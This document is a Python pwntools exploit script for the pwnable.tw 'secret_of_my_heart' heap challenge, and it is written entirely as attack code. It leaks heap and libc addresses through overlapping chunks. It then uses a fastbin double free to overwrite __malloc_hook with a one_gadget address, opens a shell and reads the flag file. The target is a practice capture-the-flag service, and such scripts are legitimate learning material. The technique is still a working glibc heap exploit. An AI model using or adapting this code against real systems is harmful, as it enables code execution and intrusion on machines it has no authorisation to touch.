#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10302
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./secret_of_my_heart_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # malloc
            brva 0x0000000000000D6F
            brva 0x0000000000000DB3

            # free
            brva 0x00000000000010F5
            brva 0x0000000000000E20

            # show
            brva 0x0000000000000F7E
            brva 0x0000000000001022
            brva 0x0000000000001057

            # exit
            brva 0x00000000000011FE
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, name, data):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'heart : ', str(size))
    p.sendafter(b'heart :', name)
    p.sendafter(b'heart :', data)

def show(idx):
    p.sendafter(b'choice :', str(2))
    p.sendafter(b'Index :', str(idx))

def free(idx):
    p.sendafter(b'choice :', str(3))
    p.sendafter(b'Index :', str(idx))

# VARIABLE


# PAYLOAD

for i in range(5): # 0 -> 4
    add(0xf8, b'a'*0x20, b'1')
show(1)
p.recvuntil(b'a'*0x20)
heap_leak = u64(p.recv(6) + b'\0'*2)
heap_base = heap_leak - 0x110
log.info("Heap base: " + hex(heap_base))

free(1)
add(0xf8, b'1', p64(0) + p64(heap_base + 0x500)) # 1

add(0xf8,b'1',b'1') # 5
add(0xf8,b'1',b'1') # 6
add(0x18,b'1',b'1') # 7

free(5)
payload = p64(heap_base + 0x100) + p64(heap_base + 0x108) + b'1'*0xe0 + p64(0x100)
add(0xf8,b'1',payload) # 5
free(6) # Merge chunks
show(5) # 5 van con
p.recvuntil(b'Secret : ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x3c3b78
log.info("Libc base: " + hex(libc.address))
malloc_hook = libc.sym.__malloc_hook
gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
stdout = libc.sym._IO_2_1_stdout_

add(0x68, b'1', b'1') # 6 <-> 5
add(0x18, b'1', b'1') # 8
add(0x68, b'1', b'1') # 9
free(5)
free(9)
free(6)
add(0x68, p64(0), p64(malloc_hook - 0x23)) # 6
add(0x68, b'1', b'1') # 9
add(0x68, b'1', b'1') # 5
add(0x68, p64(0), b'\0'*0x13 + p64(gadget[2] + libc.address)) # 10

# GDB()
free(5)
free(9)
p.sendline(b'cat /home/secret_of_my_heart/flag')

p.interactive()